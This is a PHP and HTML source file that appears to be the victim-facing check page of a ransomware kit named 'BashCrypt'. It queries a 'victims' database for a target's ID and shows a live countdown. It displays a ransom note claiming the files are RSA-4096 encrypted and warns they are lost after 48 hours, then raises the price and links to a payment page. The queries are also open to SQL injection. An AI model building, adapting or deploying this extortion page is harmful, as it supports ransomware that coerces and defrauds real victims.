<html>
<head>
  <title>
    Decryption Check
  </title>
  <script src="/scripts/jquery.js"></script>
<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "victims";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$timestamp = time();
$dateTimestamp = new DateTime("@$timestamp");

$timestamp = $dateTimestamp->format('Y-m-d H:i:s');

$targetID = $_POST['target_id'];

if (isset($_POST['target_id']) && !empty($_POST['target_id'])) {
   $sql = "SELECT timediff(exp_time, \"$timestamp\") as time_left from target_list where unique_id = \"$targetID\"";
   $result = $conn->query($sql);

   if ($result->num_rows > 0) {
      while($row = $result->fetch_assoc()) {
          if ($row['time_left'] < "00:00:01") {
             echo "<script>" . "\n";
             echo "   $(document).ready(function() {" . "\n";
             echo "     $('#form_div').hide();" . "\n";
             echo "     $('#what_happened').hide();" . "\n";
             echo "   });" . "\n";
             echo "</script>" . "\n";

             $sql1 = "UPDATE target_list SET time_expired=\"1\" where unique_id = \"$targetID\"";
             $result1 = $conn->query($sql1);

             if ($result1->num_rows >= 0) {
                echo "<center>";
                echo "<font color=\"red\">";
                echo "<h3>Time expired, your associated private key has been deleted and your files forever lost!</h3>";
                echo "<br /><br /><br />";
                echo "<h1>Alas, we have a back up key that can be used to decrypt your files; however, the payment has now increased. Please see the payment page for instructions.</h1>";
                echo "</font>";
                echo "<a href=\"/payment.php?unique_id=$targetID\"><input type=\"submit\" value=\"Pay Here\"></a>";
                echo "</center>";
             }
          } else {
             setcookie("unique_id", $targetID, strtotime('+1 hour'));

             $page = $_SERVER['PHP_SELF'];
             $sec = "1";
             header("Refresh: $sec; url=$page");
          }
      } 
   } else {
      echo "<br />Could not determine the time left!</br>"; 
   }
} else {
   $unique_id = $_COOKIE['unique_id'];

   if (isset($_COOKIE['unique_id']) && !empty($_COOKIE['unique_id'])) {

      echo "<script>" . "\n";
      echo "   $(document).ready(function() {" . "\n";
      echo "     $('#form_div').hide();" . "\n";
      echo "     $('#what_happened').hide();" . "\n";
      echo "     setInterval(function() {" . "\n";
      echo "       $.get(\"query.php?unique_id=$unique_id\", function (result) {" . "\n";
      echo "         $('#show_timer').html(result);" . "\n";
      echo "       });" . "\n";
      echo "     }, 1000);" . "\n";
      echo "  });" . "\n";
      echo "</script>" . "\n";
   }
}

$conn->close();

?>

</head>
<body background="/images/hacked.jpg" style='background-repeat: no-repeat; background-attachment: fixed; background-position: center; background-size: 100% 100%;'>
  <font color="red">
  <br /><br />
  <div id="what_happened">
    * What happened to your files?
    <br /><br />
    All of your files were protected by a strong encryption with RSA-4096 using BashCrypt v1.0. 
    <br />
    More information about the encryption keys using RSA-4096 can be found here: <a href="https://en.wikipedia.org/wiki/RSA_(cryptosystem)">RSA Cryptosystem</a>.
    <br /><br />
    * What does this mean?
    <br /><br />
    This means that the structure and data within your files have been irrevocably changed.
    <br />
    You will not be able to work with these files, read them or see them.
    <br />
    This is the same thing as losing them forever; however, with our help, you can restore them.
    <br /><br />
    * How did this happen?
    <br /><br />
    Especially for you, we generated the secret key pair RSA-4096 - public and private keys. 
    <br />
    All your files were encrypted with the public key, which has been transferred to your computer via the Internet.
    <br />
    Decrypting of your files is only possible with the help of the private key and decrypt program, which is on our secret server.
    <br /><br />
    * What do I do?
    <br /><br />
    Alas, if you do not take the necessary measures in the next 48 hrs after encryption, your private key will be deleted and your files lost forever!
    <br />
    If you really value your data, then we suggest you do not waste valuable time searching for other solutions because they do not exist.
    <br />
    Enter your unique identifier below to view your remaining time and to reach the payment page.
    <br /><br />
  </div>
  <div id="show_timer"></div>
  <div id="form_div">
    <form action="#" method="POST">
      Unique ID: <input type="text" name="target_id">
      <br />
      <input type="submit" value="Submit">
    </form>
  </div>
  </font>
</body>
<html>
